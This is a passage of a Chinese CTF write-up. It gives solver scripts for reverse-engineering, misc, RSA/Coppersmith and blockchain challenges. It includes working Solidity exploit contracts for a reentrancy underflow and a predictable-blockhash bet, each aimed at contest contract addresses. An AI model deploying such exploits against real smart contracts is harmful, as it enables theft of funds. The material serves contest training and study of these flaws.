<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack

cipher = [<span class="hljs-number">0x80B899BD</span>, <span class="hljs-number">0xEF95C26D</span>]
plain = [<span class="hljs-number">0x83EC8B55</span>, <span class="hljs-number">0xEC81F0E4</span>]

<span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0x100</span>):
    ch2 = ch * <span class="hljs-number">0x01010101</span>
    a = cipher[<span class="hljs-number">0</span>]
    b = plain[<span class="hljs-number">0</span>]
    t = (ch2 + a) &amp; <span class="hljs-number">0xFFFFFFFF</span>
    dw = b ^ t

    a = cipher[<span class="hljs-number">1</span>]
    b = plain[<span class="hljs-number">1</span>]
    t = (ch2 + a) &amp; <span class="hljs-number">0xFFFFFFFF</span>
    dw2 = b ^ t

    <span class="hljs-keyword">if</span> dw2 == dw + <span class="hljs-number">1</span>:
        <span class="hljs-keyword">break</span>

key = <span class="hljs-string">&#x27;AFSAFCEDYCXCXACNDFKDCQXC&#x27;</span>
cipher = pack(<span class="hljs-string">&#x27;&lt;4I&#x27;</span>, <span class="hljs-number">0xE6A97C50</span>, <span class="hljs-number">0xFACE0987</span>, <span class="hljs-number">0xCF0DD520</span>, <span class="hljs-number">0x6C97BB90</span>)
des = DES3.new(key)
plain = des.decrypt(cipher)

<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%08X%02X%s&#x27;</span>%(dw, ch, plain))</code></pre><p><code>flag{13242298100dcc509a6f75849b}</code></p>
<h3 id="webassembly"><a class="header-link" href="#webassembly"></a>WEBASSEMBLY</h3>
<p>xtea</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xtea_decrypt</span>(<span class="hljs-params">key,block,n=<span class="hljs-number">32</span>,endian=<span class="hljs-string">&quot;&lt;&quot;</span></span>):</span>
    v0, v1 = unpack(<span class="hljs-string">&quot;&lt;2L&quot;</span>, block)
    k = unpack(<span class="hljs-string">&quot;&lt;4L&quot;</span>, key)
    delta, mask = <span class="hljs-number">0x9e3779b9</span>,<span class="hljs-number">0xffffffff</span>
    sm = (delta * n) &amp; mask
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        v1 = (v1 - (((v0&lt;&lt;<span class="hljs-number">4</span> ^ v0&gt;&gt;<span class="hljs-number">5</span>) + v0) ^ (sm + k[sm&gt;&gt;<span class="hljs-number">11</span> &amp; <span class="hljs-number">3</span>]))) &amp; mask
        sm = (sm - delta) &amp; mask
        v0 = (v0 - (((v1&lt;&lt;<span class="hljs-number">4</span> ^ v1&gt;&gt;<span class="hljs-number">5</span>) + v1) ^ (sm + k[sm &amp; <span class="hljs-number">3</span>]))) &amp; mask
    <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&quot;&lt;2L&quot;</span>,v0,v1)

key = <span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span>
cipher = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bytearray</span>([<span class="hljs-number">0x95</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xE0</span>]))

s = <span class="hljs-string">&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher), <span class="hljs-number">8</span>):
    plain = xtea_decrypt(key, cipher[i:i+<span class="hljs-number">8</span>])
    s += plain
s += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bytearray</span>([<span class="hljs-number">0x65</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x7D</span>]))
<span class="hljs-built_in">print</span>(s)</code></pre><p><code>flag{1c15908d00762edf4a0dd7ebbabe68bb}</code></p>
<h3 id="boringcrypto"><a class="header-link" href="#boringcrypto"></a>BORINGCRYPTO</h3>
<p>AES+DES+RC4+TEA+TwoFish</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> twofish <span class="hljs-keyword">import</span> Twofish
<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack
<span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES, DES, ARC4

key = <span class="hljs-string">&#x27;415c7919c5946af18007327644ae4b872891d905ccfb065767bcc8440c730885&#x27;</span>.decode(<span class="hljs-string">&#x27;hex&#x27;</span>)

cipher = [<span class="hljs-number">0x82</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xB1</span>]
cipher = <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">bytearray</span>(cipher))

tfkey = key[:]
tf = Twofish(tfkey)
plain = tf.decrypt(cipher)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decipher</span>(<span class="hljs-params">v, k</span>):</span>
    y = c_uint32(v[<span class="hljs-number">0</span>])
    z = c_uint32(v[<span class="hljs-number">1</span>])
    sm = c_uint32(<span class="hljs-number">0xc6ef3720</span>)
    delta = <span class="hljs-number">0x9e3779b9</span>
    n = <span class="hljs-number">32</span>
    w = [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]

    <span class="hljs-keyword">while</span>(n&gt;<span class="hljs-number">0</span>):
        z.value -= ( y.value &lt;&lt; <span class="hljs-number">4</span> ) + k[<span class="hljs-number">2</span>] ^ y.value + sm.value ^ ( y.value &gt;&gt; <span class="hljs-number">5</span> ) + k[<span class="hljs-number">3</span>]
        y.value -= ( z.value &lt;&lt; <span class="hljs-number">4</span> ) + k[<span class="hljs-number">0</span>] ^ z.value + sm.value ^ ( z.value &gt;&gt; <span class="hljs-number">5</span> ) + k[<span class="hljs-number">1</span>]
        sm.value -= delta
        n -= <span class="hljs-number">1</span>

    w[<span class="hljs-number">0</span>] = y.value
    w[<span class="hljs-number">1</span>] = z.value
    <span class="hljs-keyword">return</span> w

teakey = unpack(<span class="hljs-string">&#x27;&lt;4I&#x27;</span>, key[:<span class="hljs-number">0x10</span>])[:<span class="hljs-number">4</span>]

cipher = plain[:-<span class="hljs-number">0x10</span>]
plain = <span class="hljs-string">&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher), <span class="hljs-number">8</span>):
    v = unpack(<span class="hljs-string">&#x27;&lt;2I&#x27;</span>, cipher[i:i+<span class="hljs-number">8</span>])
    t = decipher(v, teakey)
    plain += pack(<span class="hljs-string">&#x27;&lt;2I&#x27;</span>, t[<span class="hljs-number">0</span>], t[<span class="hljs-number">1</span>])


cipher = plain[:-<span class="hljs-number">8</span>]
arc4key = key
arc4 = ARC4.new(key)
plain = arc4.encrypt(cipher)


cipher = plain
deskey = key[:<span class="hljs-number">8</span>]
des = DES.new(deskey)
plain = des.decrypt(plain)


cipher = plain[:-<span class="hljs-number">8</span>]
aeskey = key
aes = AES.new(key)
plain = aes.decrypt(cipher)

plain = plain[:-<span class="hljs-number">0x10</span>]
<span class="hljs-built_in">print</span>(plain)
<span class="hljs-built_in">print</span>(plain.encode(<span class="hljs-string">&#x27;base64&#x27;</span>))</code></pre><p><code>flag{17_!$_ANnNNN_8OR|ng_CrYpTO}</code></p>
<h3 id="设备固件"><a class="header-link" href="#设备固件"></a>设备固件</h3>
<p>虚拟机</p>
<pre class="hljs"><code><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-number">0x20</span>
<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-number">0</span>
<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-number">1</span>

<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">r0</span>
<span class="hljs-keyword">je</span> loc1

<span class="hljs-keyword">mov</span> rB, <span class="hljs-number">0</span>
<span class="hljs-keyword">mov</span> rC, <span class="hljs-number">0</span>
<span class="hljs-symbol">
loc2:</span>
<span class="hljs-keyword">add</span> rC, rB
<span class="hljs-keyword">cmp</span> rB, <span class="hljs-built_in">r1</span>
<span class="hljs-keyword">add</span> rB, <span class="hljs-built_in">r2</span>
<span class="hljs-keyword">jne</span> loc2

<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-number">8</span>
<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r4</span>, <span class="hljs-number">6</span>
<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-number">0x10</span>
<span class="hljs-keyword">shl</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">r3</span>
<span class="hljs-keyword">mov</span> rA, <span class="hljs-number">0x24</span>
<span class="hljs-keyword">add</span> <span class="hljs-built_in">r9</span>, rA
<span class="hljs-keyword">add</span> <span class="hljs-built_in">r9</span>, rC
<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, input[<span class="hljs-built_in">r1</span>]
<span class="hljs-keyword">mul</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r9</span>
<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r6</span>, <span class="hljs-built_in">r5</span>

<span class="hljs-keyword">shr</span> <span class="hljs-built_in">r6</span>, <span class="hljs-built_in">r4</span>
<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r7</span>, const[<span class="hljs-built_in">r1</span>]
<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r6</span>, <span class="hljs-built_in">r7</span>
<span class="hljs-keyword">add</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">r2</span></code></pre><pre class="hljs"><code>secret = [<span class="hljs-number">0xC5B</span>, <span class="hljs-number">0xCDD</span>, <span class="hljs-number">0xD1F</span>, <span class="hljs-number">0x18C0</span>, <span class="hljs-number">0x18C6</span>, <span class="hljs-number">0xC26</span>, <span class="hljs-number">0xE72</span>, <span class="hljs-number">0xDF7</span>, <span class="hljs-number">0x19B1</span>, <span class="hljs-number">0xD41</span>, <span class="hljs-number">0xD08</span>, <span class="hljs-number">0x191C</span>, <span class="hljs-number">0xCD9</span>, <span class="hljs-number">0xEB1</span>, <span class="hljs-number">0xCEE</span>, <span class="hljs-number">0x1A78</span>, <span class="hljs-number">0xD8B</span>, <span class="hljs-number">0xD99</span>, <span class="hljs-number">0xD64</span>, <span class="hljs-number">0xCED</span>, <span class="hljs-number">0x19F8</span>, <span class="hljs-number">0xE61</span>, <span class="hljs-number">0x1A7F</span>, <span class="hljs-number">0x1AE7</span>, <span class="hljs-number">0xF26</span>, <span class="hljs-number">0x1B34</span>, <span class="hljs-number">0x1AD0</span>, <span class="hljs-number">0xD7C</span>, <span class="hljs-number">0xFC9</span>, <span class="hljs-number">0xE7E</span>, <span class="hljs-number">0x1C0E</span>, <span class="hljs-number">0x1BAE</span>]

pwd = <span class="hljs-string">&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0x20</span>):
    k = i * (i + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>
    r = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0x20</span>, <span class="hljs-number">0x7F</span>):
        t = ((k + <span class="hljs-number">0x1024</span>) * c) &gt;&gt; <span class="hljs-number">6</span>
        <span class="hljs-keyword">if</span> t == secret[i]:
            r = c
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">assert</span> r != <span class="hljs-literal">None</span>
    pwd += <span class="hljs-built_in">chr</span>(r)

<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x32\x63\x62\x63\x61&#x27;</span> + pwd)</code></pre><p><code>flag{2cbca134bb097e43b292f4431b6cd8db194db}</code></p>
<h3 id="强网先锋_ad"><a class="header-link" href="#强网先锋_ad"></a>强网先锋_AD</h3>
<p>白给</p>
<pre class="hljs"><code><span class="hljs-string">&#x27;ZmxhZ3ttYWZha3VhaWxhaXFpYW5kYW9ifQ==&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)</code></pre><p><code>flag{mafakuailaiqiandaob}</code></p>
<h2 id="misc"><a class="header-link" href="#misc"></a>MISC</h2>
<h3 id="鲲，坤-or-game"><a class="header-link" href="#鲲，坤-or-game"></a>鲲，坤 or game</h3>
<p>题目重点在游戏上，访问<code>/rom</code>可以得到<code>game.db</code>。查了一下，可以用<code>GBA</code>加载游戏。感觉是跳过xx个柱子就会有flag。先进行测试：
<img src="https://i.imgur.com/aCja6AX.jpg" alt=""></p>
<p>这次我一共跳过了6个柱子可以看到内存中的变化。对这几个地址的值尝试修改。最终将<code>0xc0a2</code>处改为<code>0xff</code>得到flag。
<img src="https://i.imgur.com/qgSXLUM.png" alt=""></p>
<h3 id="强网先锋-打野"><a class="header-link" href="#强网先锋-打野"></a>强网先锋-打野</h3>
<p>题目拖下来是一张<code>bmp</code>格式图片，常规隐写，没什么说的。直接上图：
<img src="https://i.imgur.com/Ye56wOj.png" alt=""></p>
<h2 id="crypto"><a class="header-link" href="#crypto"></a>CRYPTO</h2>
<h3 id="强网先锋-辅助"><a class="header-link" href="#强网先锋-辅助"></a>强网先锋-辅助</h3>
<p>直接把两个n求gcd，即可求出q，而第一个n/q就能得到p，再求一个逆元即可。</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> mpz <span class="hljs-keyword">import</span> gcd,invert
q=gcd(n1,n2)
p=n1/q
flag=<span class="hljs-built_in">pow</span>(res,invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),n1)</code></pre><h3 id="babybank"><a class="header-link" href="#babybank"></a>babybank</h3>
<p>区块链常见套路题。</p>
<p>首先对公链上的合约进行逆向，发现有如下几个隐藏函数。</p>
<ul class="list">
<li>profit: 给一个新用户增加余额，但是要求用户的地址结束为<code>0xb1b1</code>。</li>
<li>guess：完成profit的用户提交一个secret的候选值，正确则余额+1。</li>
<li>transfer：将余额转到其他用户上，但不可叠加，也就是说不可重复叠加余额。</li>
<li>withdraw：取款，将balance提现成以太坊，存在可重入漏洞，可实现对余额的下溢，从而有足够的余额买flag。</li>
<li>payforflag：当有了足够的余额时可以购买flag，但是这个金额无法通过正常的手段达成。</li>
</ul>
<p>首先从<a href="https://vanity-eth.tk/">vanity-eth</a>寻找满足要求的地址，依次完成profit，guess函数。</p>
<p>然后建立一个用于利用可重入漏洞的合约，并将余额转至合约地址。</p>
<pre class="hljs"><code>contract Evil {
    babybank target = babybank(<span class="hljs-number">0</span>xD630cb8c3bbfd38d1880b8256eE06d168EE3859c);
    <span class="hljs-built_in">bool</span> <span class="hljs-keyword">public</span> tryed = <span class="hljs-literal">false</span>;
    <span class="hljs-built_in">string</span> <span class="hljs-keyword">public</span> token = <span class="hljs-string">&quot;2909f6d608b0931024c23f7f7a138b97&quot;</span>;
    <span class="hljs-built_in">string</span> email = <span class="hljs-string">&quot;eXVndW9ydWk5NkBnbWFpbC5jb20=&quot;</span>;
    
    constructor() <span class="hljs-keyword">public</span> {
    }
    
    <span class="hljs-built_in">function</span> doSome() <span class="hljs-keyword">public</span> {
        target.withdraw(<span class="hljs-number">2</span>);
    }
    
    <span class="hljs-built_in">function</span>() payable <span class="hljs-keyword">public</span> {
        <span class="hljs-keyword">if</span> (!tryed) {
            tryed = <span class="hljs-literal">true</span>;
            target.withdraw(<span class="hljs-number">2</span>);
        }
    }
    
    <span class="hljs-built_in">function</span> askFlag() <span class="hljs-keyword">public</span> {
        target.payforflag(token, email);
    }
}
</code></pre><p>接着需要检查目标合约的以太坊余额，因为在withdraw中需要涉及转账，余额不够会导致利用失败。这里目的合约没有实现<code>payable</code>的默认函数，所以会导致转账失败。为此我们需要是实现一个“自杀”合约，以完成转账，代码如下。</p>
<pre class="hljs"><code>contract Bad {
    <span class="hljs-function"><span class="hljs-title">constructor</span>(<span class="hljs-params"></span>)</span> {}
    
    <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-title">payable</span> <span class="hljs-title">public</span> </span>{
        
    }
    
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        selfdestruct(<span class="hljs-number">0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c</span>);
    }
}
</code></pre><h3 id="babybet"><a class="header-link" href="#babybet"></a>babybet</h3>
<p>首先还是先逆向合约，发现如下两个隐藏函数:</p>
<ul class="list">
<li>profit: 新用户可直接取得一定数量的余额。</li>
<li>bet: 打赌，如取得胜利即可获得1000余额，但是只能进行一次。</li>
<li>名字未知，函数签名为<code>0xf0d25268</code>，作用是给其他用户转账。</li>
</ul>
<p>首先建立合约通过打赌赢得余额。</p>
<pre class="hljs"><code>contract bet {
    babybet <span class="hljs-keyword">target</span> = babybet(<span class="hljs-number">0</span>x5d1BeEFD4dE611caFf204e1A318039324575599A);
    address father;
    
    constructor(address fath) <span class="hljs-keyword">public</span> {
        father = fath;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">function</span></span> doSome() <span class="hljs-keyword">public</span> {
        <span class="hljs-keyword">target</span>.profit();
        bytes32 var0 = blockhash(<span class="hljs-keyword">block</span>.<span class="hljs-keyword">number</span> - <span class="hljs-number">1</span>);
        uint var2 = uint(var0) % <span class="hljs-number">3</span>;
        <span class="hljs-keyword">target</span>.bet(var2);
        address(<span class="hljs-keyword">target</span>).<span class="hljs-keyword">call</span>(<span class="hljs-number">0</span>xf0d25268, father, <span class="hljs-number">1000</span>);
    }
}</code></pre><p>但是余额需要的金额是打赌胜利奖金的1000倍，无法通过蛮力完成，再建立一个新的<code>Father</code>合约，此合约负责建立新的合约完成赌注。</p>
<pre class="hljs"><code>contract Father {
    <span class="hljs-built_in">string</span> <span class="hljs-keyword">public</span> token = <span class="hljs-string">&quot;2909f6d608b0931024c23f7f7a138b97&quot;</span>;
    <span class="hljs-built_in">string</span> email = <span class="hljs-string">&quot;eXVndW9ydWk5NkBnbWFpbC5jb20=&quot;</span>;
    babybet target = babybet(<span class="hljs-number">0</span>x5d1BeEFD4dE611caFf204e1A318039324575599A);
    
    
    constructor() <span class="hljs-keyword">public</span> {
    }
    
    <span class="hljs-built_in">function</span> askFlag() <span class="hljs-keyword">public</span> {
        target.payforflag(token, email);
    }
    
    <span class="hljs-built_in">function</span> make_son() <span class="hljs-keyword">public</span> {
        <span class="hljs-built_in">uint</span> i = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) {
            bet son = <span class="hljs-keyword">new</span> bet(<span class="hljs-keyword">this</span>);
            son.doSome();
        }
    }

    <span class="hljs-built_in">function</span>() <span class="hljs-keyword">public</span> payable {
    }
}</code></pre><p>完成后<code>payforflag</code>即可。</p>
<h3 id="copperstudy"><a class="header-link" href="#copperstudy"></a>copperstudy</h3>
<p>考察对sage脚本的使用😂。</p>
<pre class="hljs"><code>from pwn import *
import hashlib
import struct
from crypto_commons.generic import long_to_bytes
import gmpy2

# context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>

io = remote(<span class="hljs-string">&#x27;119.3.245.36&#x27;</span>, <span class="hljs-number">12345</span>)
io.recvline()
sha_hash = io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip()
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;hash&#x27;</span>, repr(sha_hash))

head_str = io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().decode(<span class="hljs-string">&#x27;hex&#x27;</span>)

def <span class="hljs-built_in">pow</span>():
    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
        <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;i: {}/256&#x27;</span>.format(i))
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
            <span class="hljs-keyword">for</span> <span class="hljs-keyword">k</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
                tail_str = struct.pack(<span class="hljs-string">&#x27;ccc&#x27;</span>, chr(i), chr(<span class="hljs-keyword">j</span>), chr(<span class="hljs-keyword">k</span>))
                full_str = head_str + tail_str
                sha1 = hashlib.<span class="hljs-built_in">sha256</span>()
                sha1.<span class="hljs-keyword">update</span>(full_str)
                temp_hash = sha1.hexdigest()
                <span class="hljs-keyword">if</span> temp_hash == sha_hash:
                    <span class="hljs-keyword">return</span> full_str
pow_ans = <span class="hljs-built_in">pow</span>()
<span class="hljs-keyword">print</span>(pow_ans)
io.sendlineafter(<span class="hljs-string">&quot;[-]skr.encode(&#x27;hex&#x27;)=&quot;</span>, pow_ans.encode(<span class="hljs-string">&#x27;hex&#x27;</span>))
io.sendlineafter(<span class="hljs-string">&quot;[+]teamtoken:&quot;</span>, <span class="hljs-string">&quot;our_token_lol&quot;</span>)

io.recvuntil(<span class="hljs-string">&#x27;Generating challenge 1\n&#x27;</span>)
n = io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>)
n = <span class="hljs-keyword">int</span>(n, <span class="hljs-number">16</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;n:&#x27;</span>, n)

<span class="hljs-keyword">e</span> = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;e:&#x27;</span>, <span class="hljs-keyword">e</span>)

<span class="hljs-keyword">print</span>(io.recvline())

<span class="hljs-keyword">c</span> = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">2</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;c:&#x27;</span>, <span class="hljs-keyword">c</span>)

half_m = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;half_m:&#x27;</span>, half_m)

def stereotyped(<span class="hljs-keyword">f</span>, <span class="hljs-keyword">N</span>):
    <span class="hljs-keyword">P</span>.<span class="hljs-symbol">&lt;x&gt;</span> = PolynomialRing(Zmod(<span class="hljs-keyword">N</span>))
    beta = <span class="hljs-number">1</span>
    dd = <span class="hljs-keyword">f</span>.degree()   # Degree of the polynomial
    epsilon = beta/<span class="hljs-number">7</span>
    XX = <span class="hljs-built_in">ceil</span>(<span class="hljs-keyword">N</span>**((beta**<span class="hljs-number">2</span>/dd) - epsilon))
    rt = <span class="hljs-keyword">f</span>.small_roots(XX, beta, epsilon)
    <span class="hljs-keyword">return</span> rt

ZmodN = Zmod(n)
<span class="hljs-keyword">P</span>.<span class="hljs-symbol">&lt;x&gt;</span> = PolynomialRing(ZmodN)
<span class="hljs-keyword">f</span> = (half_m+<span class="hljs-keyword">x</span>)^<span class="hljs-keyword">e</span> - <span class="hljs-keyword">c</span>
<span class="hljs-keyword">m</span> = half_m + stereotyped(<span class="hljs-keyword">f</span>, n)[<span class="hljs-number">0</span>]
m_bytes = long_to_bytes(<span class="hljs-keyword">m</span>)

io.sendlineafter(<span class="hljs-string">&quot;long_to_bytes(m).encode(&#x27;hex&#x27;)=&quot;</span>, m_bytes.encode(<span class="hljs-string">&#x27;hex&#x27;</span>))

io.recvuntil(<span class="hljs-string">&#x27;Generating challenge 2\n&#x27;</span>)

n = io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>)
n = <span class="hljs-keyword">int</span>(n, <span class="hljs-number">16</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;n:&#x27;</span>, n)

<span class="hljs-keyword">e</span> = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;e:&#x27;</span>, <span class="hljs-keyword">e</span>)

<span class="hljs-keyword">print</span>(io.recvline())

<span class="hljs-keyword">c</span> = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">2</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;c:&#x27;</span>, <span class="hljs-keyword">c</span>)


half_p = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;half_p:&#x27;</span>, half_p)

def N_factorize(<span class="hljs-keyword">f</span>, <span class="hljs-keyword">N</span>):
